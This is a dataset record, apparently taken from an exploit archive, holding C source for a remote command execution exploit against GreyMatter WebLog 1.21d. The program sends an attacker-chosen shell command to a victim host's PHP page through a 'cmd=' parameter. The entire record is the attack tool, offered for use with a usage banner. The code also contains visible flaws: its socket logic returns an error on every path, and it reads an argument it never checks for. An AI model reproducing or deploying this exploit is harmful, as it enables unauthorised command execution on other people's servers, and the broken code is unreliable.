{
  "id": "1618",
  "title": "GreyMatter WebLog 1.21d - Remote Command Execution (1)",
  "cve": null,
  "vuln_type": "unknown",
  "code": "#include <stdio.h>\r\n#include <windows.h>\r\n#include <winsock2.h>\r\n#define RETCONNERR            4                        // Connection error\r\n#define RETSOCKERR            3                        // Return for socket error\r\n#define RETRESVERR            2                        // Error code for cannot resolve host\r\n#define RETOK                 1                        // Return OK\r\n#pragma comment(lib,\"wsock32\")\r\n#define portnum 80\r\nint info(char *ls1);\r\nint ConnectWithString(char *hostname,char *string);\r\nint main(int argc,char **argv){\r\n    char buff[512]=\"\";\r\n    char get[1024]=\"\";\r\n    if(argc<3)\r\n        {\r\n            info(argv[0]);\r\n            return 0;\r\n        }\r\n    strcpy(buff,argv[2]);\r\n    strcat(buff,\"?cmd=\");\r\n    strcat(buff,argv[3]);\r\n    strcpy(get,\"GET \");\r\n    strcat(get,buff);\r\n    strcat(get,\" HTTP/1.1\");\r\n    printf(\"%s\\n\",get);\r\n    ConnectWithString(argv[1],get);\r\n    return 0;\r\n}\r\nint ConnectWithString(char *hostname,char *string)\r\n{\r\n    // Socket handle\r\n    WSADATA wsda;\r\n\r\n    // Socket file descriptor\r\n    int sockfd;\r\n\r\n    // host entrie\r\n    struct hostent *h;\r\n\r\n    // Server struct\r\n    struct sockaddr_in server;\r\n\r\n    // Return value\r\n    int ret;\r\n\r\n    // Initialize socket\r\n    WSAStartup(0x0101, &wsda);\r\n\r\n    // Open a socket\r\n    // Create tcp socket\r\n        if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)\r\n            return RETSOCKERR;\r\n\r\n    // Cannot create socket if anything fails\r\n    else\r\n        return RETSOCKERR;\r\n\r\n    // Resolve host\r\n    if((h=gethostbyname(hostname)) == NULL)\r\n            return RETRESVERR;\r\n\r\n    // Init server struct\r\n    server.sin_addr=*((struct in_addr*)h->h_addr);\r\n    server.sin_port=htons(portnum);\r\n    server.sin_family=AF_INET;\r\n\r\n    // Connect with server\r\n    if(connect(sockfd, (struct sockaddr*)&server, sizeof(struct sockaddr)) == -1)\r\n        return RETCONNERR;\r\n\r\n    // Send string\r\n    ret = send(sockfd, string, strlen(string), 0);\r\n\r\n    // Check for socket error\r\n    if(ret == SOCKET_ERROR)\r\n        return RETSOCKERR;\r\n\r\n    // Cleanup socket\r\n    WSACleanup();\r\n\r\n    closesocket(sockfd);\r\n\r\n    // Everything OK\r\n\r\n    return RETOK;\r\n}\r\nint info(char *ls1){\r\n    printf(\"******************************************************************\\n\");\r\n    printf(\"*          GREYMATTER Exploit  private version                   *\\n\");\r\n    printf(\"*         Exploit By:No_Face_King Bug By:syst3m_f4ult            *\\n\");\r\n    printf(\"*    www.crouz.com Great iranian security team                   *\\n\");\r\n    printf(\"*      Usage: %s VictimIP  GREYMATTER Path  command  *\\n\",ls1);\r\n    printf(\"*   e.g: %s 192.168.0.1  /00000008.php  uname -a     *\\n\",ls1);\r\n    printf(\"******************************************************************\\n\");\r\n    return 0;\r\n}\r\n\r\n// milw0rm.com [2006-03-28]",
  "url": "https://www.exploit-db.com/exploits/1618"
}